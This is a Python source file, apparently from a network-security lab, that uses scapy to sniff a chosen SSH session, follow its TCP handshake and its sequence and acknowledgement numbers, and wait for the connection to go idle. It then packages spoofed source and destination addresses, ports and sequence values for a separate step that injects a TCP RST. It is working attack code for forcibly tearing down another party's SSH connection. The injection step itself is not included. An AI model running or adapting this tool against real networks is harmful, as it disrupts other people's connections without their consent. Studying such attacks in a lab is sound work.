import threading
import time

from scapy.all import IP, TCP, sniff

from util import (
    CLIENT_IP,
    HEARTBEAT_INTERVAL,
    IFACE,
    SERVER_IP,
    SERVER_PORT,
    STABILITY_TIME,
    log,
    print_headers,
)


class NetworkMonitor:
    def __init__(self):
        self.client_port = None

        self.client_next_seq = 0
        self.client_expected_server_seq = 0
        self.server_next_seq = 0
        self.server_expected_client_seq = 0

        self.server_syn_seq = None

        self.handshake_complete = False
        self.connection_stable = False

        self.last_packet_time = None

        # diagnostics
        self.total_tcp_packets = 0
        self.matching_packets = 0
        self.last_packet_desc = "<none>"

        self.state_lock = threading.Lock()
        self.stabilized_event = threading.Event()

    # ------------------------------------------------------------------ #
    # packet handler
    # ------------------------------------------------------------------ #
    def packet_handler(self, packet):
        if not packet.haslayer(IP) or not packet.haslayer(TCP):
            return

        ip = packet[IP]
        tcp = packet[TCP]

        self.total_tcp_packets += 1

        if not (
            (ip.src == CLIENT_IP and ip.dst == SERVER_IP)
            or (ip.src == SERVER_IP and ip.dst == CLIENT_IP)
        ):
            return

        self.matching_packets += 1
        direction = "C->S" if ip.src == CLIENT_IP else "S->C"

        # First SYN from client identifies the SSH client port
        if direction == "C->S" and "S" in tcp.flags and "A" not in tcp.flags:
            if self.client_port is None:
                self.client_port = tcp.sport
                log(
                    "SSH",
                    f"client SYN seen  "
                    f"{CLIENT_IP}:{self.client_port} -> "
                    f"{SERVER_IP}:{SERVER_PORT}",
                )
            return

        if self.client_port is None:
            return

        valid_connection = (
            ip.src == CLIENT_IP
            and tcp.sport == self.client_port
            and ip.dst == SERVER_IP
            and tcp.dport == SERVER_PORT
        ) or (
            ip.src == SERVER_IP
            and tcp.sport == SERVER_PORT
            and ip.dst == CLIENT_IP
            and tcp.dport == self.client_port
        )
        if not valid_connection:
            return

        payload_size = len(bytes(tcp.payload))
        syn = 1 if "S" in tcp.flags else 0
        fin = 1 if "F" in tcp.flags else 0
        next_seq = tcp.seq + payload_size + syn + fin

        # --- handshake tracking -------------------------------------
        if direction == "S->C" and "S" in tcp.flags and "A" in tcp.flags:
            if self.server_syn_seq != tcp.seq:
                self.server_syn_seq = tcp.seq
                log(
                    "SSH",
                    f"server SYN-ACK seen  seq={tcp.seq}  "
                    f"(final ACK should be {tcp.seq + 1})",
                )

        if (
            direction == "C->S"
            and "A" in tcp.flags
            and "S" not in tcp.flags
            and payload_size == 0
            and self.server_syn_seq is not None
            and tcp.ack == self.server_syn_seq + 1
            and not self.handshake_complete
        ):
            with self.state_lock:
                self.handshake_complete = True
                self.last_packet_time = time.time()
            log("SSH", "3-way handshake complete")
            log("TIMER", f"idle timer started ({STABILITY_TIME}s)")

        # --- sequence tracking --------------------------------------
        if direction == "C->S":
            self.client_next_seq = max(self.client_next_seq, next_seq)
            self.client_expected_server_seq = max(
                self.client_expected_server_seq, tcp.ack
            )
        else:
            self.server_next_seq = max(self.server_next_seq, next_seq)
            self.server_expected_client_seq = max(
                self.server_expected_client_seq, tcp.ack
            )

        if self.handshake_complete:
            with self.state_lock:
                self.last_packet_time = time.time()

        # --- per-packet log -----------------------------------------
        self.last_packet_desc = (
            f"{direction} {ip.src}:{tcp.sport}->{ip.dst}:{tcp.dport} "
            f"flags={tcp.flags} seq={tcp.seq} ack={tcp.ack} len={payload_size}"
        )
        log("PKT", self.last_packet_desc)
        log(
            "STATE",
            f"C->S seq={self.client_next_seq} ack={self.client_expected_server_seq} | "
            f"S->C seq={self.server_next_seq} ack={self.server_expected_client_seq}",
        )

        if payload_size == 0:
            print_headers(ip, tcp)

    # ------------------------------------------------------------------ #
    # heartbeat
    # ------------------------------------------------------------------ #
    def heartbeat(self):
        while not self.stabilized_event.is_set():
            time.sleep(HEARTBEAT_INTERVAL)
            if self.stabilized_event.is_set():
                return
            with self.state_lock:
                hc = self.handshake_complete
                cp = self.client_port
                syn = self.server_syn_seq
                idle = (
                    (time.time() - self.last_packet_time)
                    if self.last_packet_time
                    else None
                )
            if hc:
                idle_s = f"{idle:.1f}s" if idle is not None else "n/a"
                log(
                    "HB",
                    f"tcp_seen={self.total_tcp_packets} "
                    f"matched={self.matching_packets} "
                    f"handshake=OK idle={idle_s}",
                )
            else:
                log(
                    "HB",
                    f"tcp_seen={self.total_tcp_packets} "
                    f"matched={self.matching_packets} "
                    f"client_port={cp} "
                    f"server_syn_seq={syn} "
                    f"handshake=WAITING",
                )

    # ------------------------------------------------------------------ #
    # stability monitor (with countdown)
    # ------------------------------------------------------------------ #
    def stability_monitor(self):
        while True:
            time.sleep(1)
            with self.state_lock:
                if not self.handshake_complete:
                    continue
                if self.connection_stable:
                    return
                if self.last_packet_time is None:
                    continue
                inactive = time.time() - self.last_packet_time

            remaining = STABILITY_TIME - inactive
            if remaining > 0:
                log(
                    "COUNTDOWN",
                    f"idle {inactive:5.1f}s / {STABILITY_TIME}s  "
                    f"-->  RST in {remaining:4.0f}s",
                )
                continue

            with self.state_lock:
                self.connection_stable = True
            log(
                "STABLE",
                f"idle {inactive:.1f}s >= {STABILITY_TIME}s — ready to inject RST",
            )
            self.stabilized_event.set()
            return

    # ------------------------------------------------------------------ #
    # lifecycle
    # ------------------------------------------------------------------ #
    def start(self):
        log(
            "INIT",
            f"sniff iface={IFACE}  "
            f"filter='tcp and host {CLIENT_IP} and host {SERVER_IP}'",
        )

        def _sniff():
            try:
                sniff(
                    filter=f"tcp and host {CLIENT_IP} and host {SERVER_IP}",
                    prn=self.packet_handler,
                    store=False,
                    iface=IFACE,
                )
            except Exception as e:
                log("ERR", f"sniff() failed: {e!r}")

        threading.Thread(target=_sniff, daemon=True).start()
        threading.Thread(target=self.heartbeat, daemon=True).start()
        threading.Thread(target=self.stability_monitor, daemon=True).start()
        log("INIT", "threads started  (sniffer, heartbeat, stability)")

    def wait_for_stability(self):
        self.stabilized_event.wait()

    # ------------------------------------------------------------------ #
    # state for RST injection
    # ------------------------------------------------------------------ #
    def get_state(self, target):
        with self.state_lock:
            if self.client_port is None:
                raise RuntimeError(
                    "client_port is None — SSH client SYN was never captured. "
                    f"Check IFACE='{IFACE}' in util.py."
                )
            if not self.handshake_complete:
                raise RuntimeError(
                    "handshake_complete is False — final ACK was never matched "
                    f"(server_syn_seq={self.server_syn_seq!r}). "
                    "The SSH session was likely already up before the sniffer "
                    "started; open a fresh SSH session."
                )

            if target == "SERVER":
                st = {
                    "source_ip": CLIENT_IP,
                    "source_port": self.client_port,
                    "destination_ip": SERVER_IP,
                    "destination_port": SERVER_PORT,
                    "seq": self.client_next_seq,
                    "ack": self.server_next_seq,
                }
            else:
                st = {
                    "source_ip": SERVER_IP,
                    "source_port": SERVER_PORT,
                    "destination_ip": CLIENT_IP,
                    "destination_port": self.client_port,
                    "seq": self.server_next_seq,
                    "ack": self.client_next_seq,
                }
            log("STATE", f"injection target={target}  {st}")
            return st
